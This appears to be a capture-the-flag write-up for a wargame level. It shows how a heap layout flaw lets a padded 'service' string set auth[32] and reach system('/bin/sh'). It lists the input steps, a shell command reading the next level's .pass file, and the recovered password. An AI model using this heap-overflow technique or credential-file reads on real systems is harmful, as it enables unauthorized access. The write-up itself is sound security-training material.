After spending a long time reversing asm to C, we can see that to reach system("/bin/sh") the auth[32] must be different than the NULL character (test instruction)

But we can see the auth buffer is 4 byte long since auth = malloc(4)

So if we copy in the auth buffer a string longer than 4 byte it will segfault.

We see the service buffer which is allocated by strdup so it will be allocated on the heap just after auth buffer.
So when we check auth[32] we will check inside service buffer if it's long enough.

Heap : 

0      4           8             12
| AUTH | PREV SIZE | CHUNCK SIZE | SERVICE ..... |


So first we exec level8

./level8
(nil), (nil)
auth 
0x804a008, (nil)

We write "auth " so it first allocate the auth buffer.
It will copy inside auth everything after "auth " but we don't need to copy anything here

Then we write service with a bunch of random char after it will allocate service buffer and copy what's after in it.
Enough char so when we access auth[32] it access this string

serviceejkzajkezaljezaojezapjezapezap
0x804a008, 0x804a018

Then login to display a prompt

$ cat /home/user/level9/.pass

c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
